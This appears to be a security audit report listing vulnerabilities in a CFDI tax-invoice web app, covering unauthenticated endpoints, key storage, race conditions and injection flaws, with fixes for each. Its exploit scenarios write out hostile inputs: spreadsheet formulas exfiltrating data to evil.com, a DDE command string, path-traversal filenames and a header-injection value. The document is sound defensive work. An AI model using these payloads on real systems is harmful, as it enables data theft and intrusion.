candidates.title: Entire API surface (~30+ endpoints) has zero authentication — no middleware, no dependency injection, no token verification
candidates.description: The FastAPI app mounts 8 routers with over 30 endpoints. Zero Depends(), OAuth2, Bearer, or auth middleware exists anywhere. All endpoints are open to any network-reachable HTTP client.
candidates.exploit_scenario: An attacker with the Cloud Run URL sends requests via curl/Postman, bypassing CORS entirely. They can create/delete emisor credentials, query SAT via stored Diverza credentials, configure/delete FIEL certificates, submit CFDI for analysis, generate PDFs, and manage templates — all without any identity verification.
candidates.recommendation: Implement authentication via FastAPI dependency injection. Apply APIRouter(dependencies=[Depends(verify_token)]) to each router or add a global middleware.

candidates.title: Batch worker-task endpoint has zero authentication — arbitrary GCS object access and CFDI processing
candidates.description: POST /api/cfdi/batch/worker-task has NO auth — not even the weak x-cloudtasks-queuename header check present in pdf.py internal endpoints. Accepts any JSON with batch_id, filename, and gcs_path. Downloads arbitrary GCS blobs and runs CFDI analysis.
candidates.exploit_scenario: Attacker sends POST with {'batch_id':'attacker','filename':'stolen.xml','gcs_path':'xml_temp/analysis_VICTIM/sensitive.xml'}. Endpoint downloads the GCS object and processes it, exposing data. Combined with Cloud Run --allow-unauthenticated, this is exploitable by anyone who discovers the URL.
candidates.recommendation: Add OIDC token verification via Cloud Tasks service account. At minimum add x-cloudtasks-queuename header check with queue name validation. Validate gcs_path prefix is restricted to xml_temp/analysis_{batch_id}/.

candidates.title: Emisor credential CRUD (create, overwrite, delete) completely unauthenticated — credential_token accepted and stored
candidates.description: POST /api/emisores creates new emisor credentials including credential_token for Diverza API. PUT overwrites any existing emisor. DELETE removes any emisor. Zero Depends() or auth check on any of these endpoints.
candidates.exploit_scenario: Attacker sends POST with {'rfc':'VICTIM','credential_id':'atk-id','credential_token':'atk-token'} to inject fraudulent credentials. Or sends PUT to hijack existing Diverza credentials. Then uses /api/sat/enquiry to query SAT impersonating the victim. DELETE sabotages operations outright.
candidates.recommendation: Add Depends(authenticate_user) to the router or individual endpoints. Verify caller identity before allowing credential mutations.
candidates.snippet:

def create_emisor(body: EmisorCreate) -> EmisorPublic:

candidates.title: Vercel rewrite makes internal Cloud Tasks endpoints same-origin — x-cloudtasks-queuename header forgeable via XSS
candidates.description: The Vercel rewrite proxies all /api/* to Cloud Run, making every backend endpoint same-origin to Vercel domain. Internal endpoints (/api/internal/generate-pdf, /api/internal/extract-zip) protect only via checking presence of 'x-cloudtasks-queuename' header — no OIDC, no signature. The queue name ('pdf-generator-queue') is public. Any XSS on Vercel domain can forge this header.
candidates.exploit_scenario: XSS on cfdiinspector.vercel.app sends fetch('/api/internal/generate-pdf', {headers:{'x-cloudtasks-queuename':'pdf-generator-queue'}, body:JSON.stringify({job_id:'malicious',...})}). The rewrite proxies to Cloud Run. Backend sees header and processes as legitimate Cloud Tasks invocation, burning CPU and generating PDFs from attacker-controlled payloads.
candidates.recommendation: Add OIDC token authentication to Cloud Tasks task creation and validate on receiving endpoints. Restrict internal endpoints to Cloud Tasks IP ranges or require HMAC signature.

candidates.title: Batch SAT enquiry accepts Excel uploads with no authentication — enables mass SAT queries consuming legit stored credentials
candidates.description: POST /api/sat/enquiry/batch processes uploaded Excel with UUIDs/RFCs for batch SAT queries via Diverza API, using stored emisor credentials. Zero auth. Attacker can upload Excel with thousands of UUIDs querying SAT at scale and burning Diverza API quota tied to victim's credentials.
candidates.exploit_scenario: Attacker crafts Excel with 1000+ UUID rows referencing victim RFCs (obtained from unauthenticated GET /api/emisores). Server processes each row calling Diverza API with victim's credential_id and credential_token. Results stream back via SSE. Victim's Diverza quota consumed.
candidates.recommendation: Require authentication before SAT enquiries, especially batch operations that amplify impact. Add rate limiting.
candidates.snippet:
@router.post("/enquiry/batch")
async def batch_sat_enquiry(file: UploadFile = File(...)) -> StreamingResponse:

candidates.title: Formula injection via user-supplied Excel fields reflected in output XLSX (row data loop)
candidates.description: UUID, RFC emisor, RFC receptor, and motive fields from user-uploaded Excel are written directly to output XLSX cells via openpyxl without sanitization against formula injection characters (=, +, -, @).
candidates.exploit_scenario: Attacker uploads Excel with UUID column = cmd|'/c calc'!A0 (DDE) or =IMPORTXML("http://evil.com/","//data") (web query). Value echoed verbatim to output Excel. Attacker sends download URL to victim. When victim opens Excel, formula executes.
candidates.recommendation: Prefix cell values starting with =, +, -, @ with single quote (') before calling ws.append. Apply to all columns sourced from user input and Diverza-sourced columns as defense-in-depth.

candidates.title: Batch SAT enquiry result endpoint retrievable without authentication — only requires knowing UUID4 job_id
candidates.description: GET /api/sat/enquiry/batch/{job_id}/result returns Excel with no auth and no ownership verification. Job_ids are broadcast in SSE streams and may leak via logs, browser history, or shared networks. UUID4 is the only defense.
candidates.exploit_scenario: Attacker observes SSE stream on shared network and extracts job_id. GET /api/sat/enquiry/batch/{job_id}/result downloads full Excel with all SAT status results. Data already obtained before pop() removes it.
candidates.recommendation: Require authentication and verify requesting identity matches batch initiator. Tie job results to a session or authenticated user.
candidates.snippet:
def get_batch_result(job_id: str) -> Response:
    excel_bytes = _job_results.pop(job_id, None)

candidates.title: CFDI analysis endpoint /api/cfdi/analyze has no authentication — anyone can submit CFDI for parsing
candidates.description: POST /api/cfdi/analyze accepts XML up to 20MB and returns parsed CFDI financial data (ingresoRows, pagoRows, cfdi dict). No Depends(), no auth check, no rate limiting.
candidates.exploit_scenario: Attacker submits CFDI XMLs obtained through other means to extract structured financial data (RCFs, amounts, items). Or sends repeated large payloads to exhaust server CPU (analysis runs synchronously in request thread).
candidates.recommendation: Add authentication dependency. Consider rate limiting per caller.

candidates.title: Unsanitized UploadFile.filename interpolated into GCS blob paths allows storage trajectory outside lifecycle-managed prefix
candidates.description: User-supplied UploadFile.filename is interpolated directly into GCS blob paths without sanitization at batch.py:137 and batch.py:291. Attacker can craft filenames with '../' sequences that place blobs outside xml_temp/ lifecycle-managed prefix, where they persist indefinitely.
candidates.exploit_scenario: Attacker uploads file with Content-Disposition filename='../../persistent_evil.xml'. GCS blob written outside xml_temp/ prefix. Lifecycle policy never cleans it. Also at line 291, result written to xml_temp/analysis_results_{batch_id}/../../persistent.xml, escaping cleanup.
candidates.recommendation: Sanitize filename: os.path.basename() to strip directory components, whitelist safe characters (alphanumeric, underscores, dots, dashes). Apply at both lines 137 and 291.

candidates.title: Header injection via unsanitized rfc_presentante in Content-Disposition filename
candidates.description: batch_diot constructs Content-Disposition header from user-supplied rfc_presentante form field. Only uppercased and space-replaced — no stripping of double-quote or newline characters. Attacker can inject Content-Disposition directives or break header structure.
candidates.exploit_scenario: Attacker POSTs with rfc_presentante='"; disposition=inline; filename="attack.txt'. Content-Disposition becomes: attachment; filename="DIOT_"; DISPOSITION=INLINE; FILENAME="ATTACK.TXT_202607.txt". Browser receives manipulated header changing file handling. \r\n injection could add arbitrary response headers.
candidates.recommendation: Strip/escape double-quote chars and newlines from rfc_presentante. Use filename-safe whitelist (alphanumeric, hyphens, underscores only). Use library function for Content-Disposition construction.

candidates.title: Race condition in credential file persistence — read-modify-write with no locking causes silent data loss
candidates.description: set_emisor() and delete_emisor() follow unprotected read-modify-write: _load_raw() reads JSON from disk, modify dict, _save_raw() writes. No fcntl.flock, threading.Lock, or DB transaction. Two concurrent requests interleave and silent data loss occurs.
candidates.exploit_scenario: Two concurrent POST to /api/emisores create emisores 'AAA' and 'BBB'. Both call _load_raw() → both get empty dict. Request A calls _save_raw({'AAA':...}). Request B calls _save_raw({'BBB':...}). File ends up with only BBB — AAA silently lost.
candidates.recommendation: Add file locking (fcntl.flock) around read-modify-write cycle or migrate to concurrent-safe store (SQLite WAL, Redis, DB).
candidates.snippet:
def set_emisor(rfc: str, data: dict[str, str]) -> None:
    raw = _load_raw()
    raw[rfc.upper()] = data
    _save_raw(raw)

candidates.title: Shared Fernet encryption key between FIEL key material and PAC credential tokens
candidates.description: Both fiel_config.py:10 and credentials.py:10 use identical _KEY_FILE (~/.cfdi-suite/secret.key) as Fernet symmetric key. Same AES-128-CBC key protects FIEL e-signature private key (government-issued legal identity) AND PAC credential tokens (third-party API keys). Single key compromise exposes both sensitivity levels.
candidates.exploit_scenario: Attacker obtains Fernet key through filesystem read, memory dump, or side channel. Can decrypt FIEL private key AND all stored PAC credential tokens. FIEL key enables signing CFDI; PAC credentials enable cancelling/querying CFDI. Single key = full taxpayer impersonation.
candidates.recommendation: Use separate Fernet key files for FIEL and credentials (e.g., fiel.key, credentials.key). Or derive separate encryption keys from master key using HKDF with distinct info strings.

candidates.title: GET /api/fiel/status exposes configured FIEL RFC without authentication — information disclosure
candidates.description: GET /api/fiel/status returns whether FIEL is configured and the RFC extracted from the certificate, with zero authentication. Any network-accessible client can discover if FIEL is installed and the RFC of the owner.
candidates.exploit_scenario: Attacker GETs /api/fiel/status. Response: {configurada: true, rfc: 'ABC123456789'}. Now knows there's a valid e.firma installed and the taxpayer RFC — can target other unauthenticated FIEL endpoints (configure/delete/validate_sat).
candidates.recommendation: Add authentication dependency on get_fiel_status. If single-user tool, document risk and restrict via firewall.
candidates.snippet: return FielStatus(configurada=rfc is not None, rfc=rfc)

candidates.title: POST /api/rfc/validate/sat without rate limiting — allows account lockout on real SAT portal
candidates.description: Each call creates real SAT portal session using stored FIEL credentials (portal.login()). No authentication, no rate limiting. Repeated requests can trigger SAT security alerts, rate limits, or account lockout.
candidates.exploit_scenario: Attacker sends 100+ POST /api/rfc/validate/sat in rapid succession with valid RFCs. Each request initiates login against SAT portal using stored FIEL. SAT detects anomalous query volume and locks the FIEL-associated account, blocking legitimate taxpayer from consultas.
candidates.recommendation: Implement rate limiting (max 5/min per IP). Add mandatory authentication to access SAT-consuming functionality.

candidates.title: CSV formula injection via unsanitized cell values in BatchAnalysisPage export
candidates.description: exportResultsCsv builds CSV by only double-quote escaping cell values — no formula character prefixing (=, +, -, @). filename from user-uploaded XML name and nombre_emisor from attacker-controlled XML flow directly into CSV cells.
candidates.exploit_scenario: Attacker crafts XML named =HYPERLINK("http://evil.com")_factura.xml with emisor nombre_emisor = =WEBSERVICE("http://evil.com/exfil?data="&A1). After batch analysis, analyst exports and opens CSV in Excel. Formulas execute making outbound HTTP requests.
candidates.recommendation: Prefix cell values starting with =, +, -, @ with single quote (') to force literal interpretation: if (String(v).match(/^[=+\-@]/)) return `'"${escaped}"`;

candidates.title: FIEL private key password stored in React state — visible in React DevTools
candidates.description: FIEL (.key) password held in useState inside FielCard component. Any browser extension or DevTools user can read it while form is open. Only cleared on success, remains in memory during entry.
candidates.exploit_scenario: Attacker with physical access opens React DevTools → Components → FielCard → reads password from state. Extension malware could do this programmatically. With .cer/.key files (already on that machine), attacker can sign SAT transactions.
candidates.recommendation: Remove password from React state. Use dedicated Shadow DOM <input type='password'> with value in useRef closure. Clear DOM ref on unmount.

candidates.title: Diverza credential_token stored in React state — visible in React DevTools
candidates.description: Diverza credential_token (PAC secret) held in useState in EmisorModal component. Inspectable in React DevTools throughout modal lifetime, even when visually masked.
candidates.exploit_scenario: React DevTools or extension reads token state from EmisorModal. Token authorizes SAT consultation/cancellation through Diverza PAC. Exfiltration allows impersonating emisor's PAC relationship.
candidates.recommendation: Keep credential token only in DOM input's .value property (uncontrolled via useRef). Never mirror into React state. Submit at save time by reading ref.current.value.

candidates.title: Pusher public channel broadcasts sensitive fiscal data without authentication — any client with batchId can subscribe
candidates.description: Pusher channel 'pdf-batch-{batchId}' subscribed as public (no authEndpoint/authorizer). BatchId recoverable from localStorage, share URLs (?batch=<id>), browser network tab. Same pattern in BatchAnalysisPage.tsx:808 for 'batch_{batchId}'. Any client with Pusher key (public JS bundle) can subscribe.
candidates.exploit_scenario: Attacker visits shared batch link or reads localStorage. Extracts batchId. Creates Pusher connection with app key from JS bundle. Subscribes to pdf-batch-{id}. Receives file_processed events with RFC emisor/receptor, amounts, findings — tax-relevant PII.
candidates.recommendation: Switch to Pusher private channels (private-pdf-batch-{id}). Implement auth endpoint verifying caller owns/is authorized for that batch. Configure authorizer callback.

candidates.title: Batch share URL grants unauthenticated access to batch progress and PDF downloads — no ownership verification
candidates.description: Batch share URL (?batch=<id>) treated as valid restore token. Any visitor with URL calls fetchReadyFileIds, subscribes to Pusher, and downloads PDFs/full ZIP. BatchId alone acts as bearer credential. If batchIds are guessable, attacker enumerates and downloads other users' fiscal documents.
candidates.exploit_scenario: User Bob converts batch and shares URL ?batch=bob-001. Attacker Alice increments to ?batch=bob-002 and loads page. Frontend restores batch, fetches file IDs, subscribes to progress. Alice downloads each PDF and full ZIP. No credential exchange occurs.
candidates.recommendation: Require backend-side ownership verification on fetchReadyFileIds, getBatchDownloadUrl, fetchPdfDownloadUrl. Gate endpoints with authenticated user identity.

candidates.title: Divergent env var strategies (merge vs overwrite) between two CI pipelines create race condition on deployment
candidates.description: cloudbuild.yaml uses --update-env-vars (merge) setting only ALLOWED_ORIGINS. deploy-backend.yml uses env_vars_update_strategy: overwrite replacing all vars. If both trigger simultaneously on same Cloud Run service, last deploy wins. If cloudbuild.yaml wins, critical env vars (REDIS_*, GCS_BUCKET_NAME, SENTRY_DSN, PUSHER_*) could be absent.
candidates.exploit_scenario: Push to main triggers both pipelines. cloudbuild.yaml finishes last, deploying with only ALLOWED_ORIGINS set. All other env vars (Redis, GCS, Sentry, Pusher) now absent. Redis fails, Pusher breaks, Sentry stops, file uploads fail. Service degraded until next overwrite deploy restores full env set.
candidates.recommendation: Unify pipelines to same env var strategy. Either both use --update-env-vars (merge) with complete set, or both declare all required vars. Better: single pipeline for all deployments.

candidates.title: Master encryption key stored alongside encrypted data in ~/.cfdi-suite/ — single directory compromise exposes everything
candidates.description: Fernet master key (secret.key) and encrypted data (fiel.enc, emisores.enc) all stored in ~/.cfdi-suite/. If attacker obtains directory read access (e.g., via path traversal vulnerability), can read both key and ciphertext — trivial decryption. 0o600 file permissions are sole protection.
candidates.exploit_scenario: Attacker exploits path traversal in templates.py to read ~/.cfdi-suite/secret.key and ~/.cfdi-suite/fiel.enc. Decrypts FIEL (cer + key + password) using cryptography library. Same for emisores.enc with PAC credentials.
candidates.recommendation: Derive Fernet key from user-provided passphrase. Or use OS keyring (macOS Keychain, gnome-keyring) to store master key outside data directory.

candidates.title: TOCTOU race condition in Fernet key generation on cold start — concurrent requests can produce orphaned ciphertext
candidates.description: _fernet() and _ensure_key() use check-then-write without file locking. On cold start with concurrent requests, both threads observe key missing, generate different keys, last writer wins. Data encrypted with orphaned key becomes irrecoverable.
candidates.exploit_scenario: Two concurrent requests on fresh deploy: POST /api/fiel/configure and GET /api/emisores. Thread A writes key X, encrypts FIEL with key X. Thread B writes key Y, encrypts emisores with key Y. File now has key Y. FIEL data encrypted with key X fails with InvalidToken — silently corrupted.
candidates.recommendation: Use fcntl.flock around check-generate-write-read sequence. Better: generate key once at application startup (lifespan event) before serving requests.

candidates.title: FIEL password stored in plaintext within Fernet blob alongside key material — two-factor reduced to single factor
candidates.description: save_fiel() stores FIEL password as plaintext in JSON payload encrypted with Fernet. No PBKDF2, bcrypt, or argon2. Password is second auth factor for .key private key — storing alongside key material under same Fernet key eliminates two-factor property. Fernet key compromise = both key AND password.
candidates.exploit_scenario: Attacker gains Fernet key and fiel.enc. Decrypts blob → recovers both .key bytes AND password. Proper two-factored FIEL requires attacker to still need password even with .key file. Here, both factors collapse to single Fernet key.
candidates.recommendation: Encrypt password with separate key derived from hardware-bound secret or env var. Or require user re-enter password for each signing operation and never persist.

candidates.title: Race condition in save_fiel/load_fiel/delete_fiel — concurrent operations on same file without locking
candidates.description: save_fiel, load_fiel, delete_fiel operate on same fiel.enc file without locking. Concurrent writes can interleave, concurrent load+delete can read nonexistent file. Possible because endpoints lack authentication so concurrent requests are feasible.
candidates.exploit_scenario: Two concurrent POST to /api/fiel/configure: Request A writes FIEL_EMPRESA_A, Request B writes FIEL_EMPRESA_B. write_bytes() calls interleave, file ends in inconsistent state. Concurrent DELETE + load in validate_rfc_sat causes FileNotFoundError.
candidates.recommendation: Use fcntl.flock or threading.Lock around all fiel.enc read/write/delete operations.

candidates.title: Entity expansion DoS via stdlib ET.fromstring without defusedxml in XML parsing fallback
candidates.description: ET.fromstring(xml) at wrapper.py:406 (fallback), batch.py:83 (header extract), batch_reports.py:31 (DIOT extract) use stdlib ElementTree without defusedxml. Python 3.11+ disables external entities but entity expansion (billion laughs) can still exhaust CPU/memory. Main satcfdi path (wrapper:421 via lxml no_network=True) is properly protected.
candidates.exploit_scenario: Attacker uploads XML with deeply nested internal entity definitions. Parsed by any of three ET.fromstring calls, expansion consumes excessive CPU/memory. Subprocess timeout provides partial mitigation but resource exhaustion before timeout could impact co-located requests.
candidates.recommendation: Replace import xml.etree.ElementTree with import defusedxml.ElementTree in all three files. Add defusedxml to requirements.txt.

candidates.title: Pusher channel event data consumed as 'any' type without schema validation — state corruption risk
candidates.description: channel.bind('file_processed', (parsedResult: any) => ...) consumes event data typed as any without runtime schema validation. filename field used in state mutations and UI rendering. Malicious Pusher server could inject unexpected fields that corrupt application state.
candidates.exploit_scenario: If Pusher credentials compromised or MITM intercepts WebSocket, attacker emits file_processed events with crafted payloads containing unexpected types or excessive fields, causing UI corruption, state inconsistencies, or triggering edge cases in completion detection.
candidates.recommendation: Add runtime schema validation (Zod or type guard) verifying parsedResult conforms to expected BatchFileResult shape before merging into state.

candidates.title: SSE event data JSON.parsed without schema validation — malformed events could corrupt progress state
candidates.description: SSE stream events parsed via JSON.parse(line.slice(6)) as BatchProgressEvent with type-cast but no runtime validation. Event passed to onEvent callback driving progress UI and job state. Malformed SSE data could corrupt progress display or misroute job IDs.
candidates.exploit_scenario: If backend SSE endpoint compromised or reverse proxy injects data, crafted SSE message with unexpected fields (type set to unknown, job_id being non-string) causes progress bar to display incorrect values or prevent 'done' transition from triggering.
candidates.recommendation: Validate parsed object against BatchProgressEvent discriminated union at runtime before calling onEvent. Ensure type is 'progress' or 'done' and numeric fields are actually numbers.

candidates.title: File upload handlers rely solely on file extension without content-type or magic-byte validation
candidates.description: Multiple file upload handlers accept files based only on extension checks (.endsWith('.xml'), .endsWith('.zip')) at ConversionMasivaPage.tsx:176, BatchAnalysisPage.tsx:953, ConsultasSATPage.tsx:36. No file.type inspection, magic-byte verification, or content sniffing.
candidates.exploit_scenario: Attacker renames HTML file with <script> to factura.xml. Passes client-side .endsWith('.xml') check. If backend XML parser is lenient and extracts text reflected in results without encoding, XSS could occur. Even without XSS, bypasses intended file filter.
candidates.recommendation: Add client-side content-type validation: check file.type against expected MIME types and/or read first bytes for magic numbers (XML declaration).

candidates.title: localStorage batchId used for API URL construction without sanitization — path injection risk on batch recovery
candidates.description: localStorage.getItem('cfdi_active_batch_id') read at line 743 and passed unencoded into fetch URL template at line 770 (${resolveApiBaseUrl()}/api/cfdi/batch/status/${batchId}). If XSS or local access sets value to path traversal sequence (../../../admin/delete), URL points to unintended endpoint.
candidates.exploit_scenario: Attacker with XSS writes localStorage.setItem('cfdi_active_batch_id', '../../../admin/config'). On next visit, BatchAnalysisPage auto-recovers batch and fetches /api/cfdi/batch/status/../../../admin/config. Backend with lax path normalization resolves to unexpected endpoint.
candidates.recommendation: Validate batchId against UUID regex before URL construction. Reject and clear non-matching values.

candidates.title: Vite proxy changeOrigin:true can bypass production CORS when misconfigured — local to production proxying
candidates.description: Vite dev proxy uses changeOrigin:true, rewriting Origin header to match target. If VITE_API_PROXY_TARGET points to production Cloud Run URL (discoverable from vercel.json/cloudbuild.yaml), local requests proxy to production with forged Origin matching ALLOWED_ORIGINS, bypassing CORS. Target defaults to 127.0.0.1:8000 but env override lacks validation.
candidates.exploit_scenario: Developer sets VITE_API_PROXY_TARGET=https://cfdi-suite-api-hfg67q6kbq-uc.a.run.app. Runs npm run dev. All local /api/* requests proxied to production with changeOrigin rewriting Origin. Production CORS sees Origin as matching, all requests pass. Developer accidentally modifies production data/credentials.
candidates.recommendation: Set changeOrigin:false or validate VITE_API_PROXY_TARGET only allows localhost/127.0.0.1. Add hard block if target points to *.run.app URL.

candidates.title: GCS signed URL access_token in query string combined with CORS wildcard — cross-origin token leakage
candidates.description: Upload and download signed URLs pass access_token=credentials.token to blob.generate_signed_url(), placing OAuth2 token in query string. Logged in browser history, access logs, Referer headers. Combined with cors-gcs.json origin:['*'], any third-party page with the URL can make authenticated GCS operations for 15-min window.
candidates.exploit_scenario: Legitimate user requests signed upload URL. Response contains URL with access_token=ya29.xxx. Browser history or Referer leak exposes token. With CORS *, malicious page fetches signed URL and makes authenticated GCS PUT/GET during validity window.
candidates.recommendation: Use IAM SignBlob for signed URLs instead of passing access_token. Or restrict GCS CORS to specific origins instead of *.

candidates.title: Production Cloud Run URL hardcoded in multiple public versioned files — trivially discoverable
candidates.description: Production Cloud Run URL (cfdi-suite-api-hfg67q6kbq-uc.a.run.app) hardcoded in vercel.json:5, cloudbuild.yaml:6, deploy-backend.yml:49. Makes backend endpoint trivially discoverable from public repo. Combined with --allow-unauthenticated, attackers bypass Vercel entirely and target Cloud Run directly.
candidates.exploit_scenario: Attacker reads public repo, finds URL. Directly sends requests to Cloud Run bypassing Vercel and its CORS. CORS irrelevant for direct (non-browser) requests. x-cloudtasks-queuename header trivially forged.
candidates.recommendation: Remove hardcoded production URL from versioned files. Use GitHub Secrets or Cloud Build substitution variables for environment-specific URLs.

confirmed_existing.title: Error details leaked in HTTP responses
confirmed_existing.evidence: main.py:75 — str(exc) in 400 response from InvalidArgument handler. sat_enquiry.py:198 — str(exc) in batch result dict. sat_enquiry.py:303 — HTTPException with exc in detail.
confirmed_existing.note: main.py:75 leaks GCP API error strings (project IDs, queue paths). sat_enquiry.py sends httpx/connection errors in Excel and JSON responses.

confirmed_existing.title: ET.fromstring sin defusedxml
confirmed_existing.evidence: wrapper.py:406, batch.py:83, batch_reports.py:31 — all three use stdlib ET.fromstring without defusedxml. Main satcfdi lxml path (no_network=True) is protected.
confirmed_existing.note: Continued in BATCH6-CANDIDATE-25 with billion laughs expansion risk assessment.

confirmed_existing.title: SSRF via UUID path traversal to Diverza API
confirmed_existing.evidence: sat_enquiry.py:150 — url = f"{_DIVERZA_BASE}/{uuid}/sat_cfdi_enquiry" with uuid from untrusted EnquiryRequest. No validation on uuid field (bare str). ../ sequences and query string injection feasible in URL path.
confirmed_existing.note: Diverza base is hardcoded so full SSRF to arbitrary hosts NOT possible, but lateral movement within Diverza's API surface IS.

confirmed_existing.title: Zip bomb / Memory DoS via openpyxl
confirmed_existing.evidence: sat_enquiry.py:211 — openpyxl.load_workbook(io.BytesIO(content), data_only=True) with only 10MB file-size cap. No compression ratio check. 10MB zip bomb expands to gigabytes.
confirmed_existing.note: No read_only=True flag for streaming mode. No decompression size limit enforced.

confirmed_existing.title: Diverza response → formula injection in Excel
confirmed_existing.evidence: sat_enquiry.py:95-98,259-272 — Diverza JSON fields (estado, es_cancelable, estatus_cancelacion, error) written to Excel without sanitization. Different from BATCH6-CANDIDATE-06 which covers user-input side.
confirmed_existing.note: Two vectors: user-supplied Excel cells (new CANDIDATE-06) and Diverza API response fields (existing #46).

confirmed_existing.title: Sin validación MIME/content-type en uploads
confirmed_existing.evidence: Backend: sat_enquiry.py:313 accepts UploadFile without content-type check. Frontend: ConversionMasivaPage.tsx:176 only checks file extension (.endsWith('.xml')), no file.type or magic-byte.
confirmed_existing.note: Both backend and client rely on extension-only validation.

confirmed_existing.title: Cloud Tasks sin OIDC — endpoints internos spoofables
confirmed_existing.evidence: task_dispatcher.py:30-36 — enqueue_pdf_generation no oidc_token. batch.py:210 — worker-task zero auth. pdf.py:107 — only checks x-cloudtasks-queuename header presence. vercel.json:5 rewrite amplifies by making internal endpoints same-origin.
confirmed_existing.note: Batch worker-task (batch.py:210) is the most exposed — zero header check or OIDC. New finding BATCH6-CANDIDATE-02 covers this specific amplification.

confirmed_existing.title: Cross-session data leak via _job_results
confirmed_existing.evidence: sat_enquiry.py:24,359-374 — _job_results dict keyed by job_id with no user/session binding. job_ids broadcast in SSE streams. UUID4 is only defense.
confirmed_existing.note: New finding BATCH6-CANDIDATE-07 covers the specific GET result endpoint's lack of ownership check.

confirmed_existing.title: Fernet key silent loss on cold start
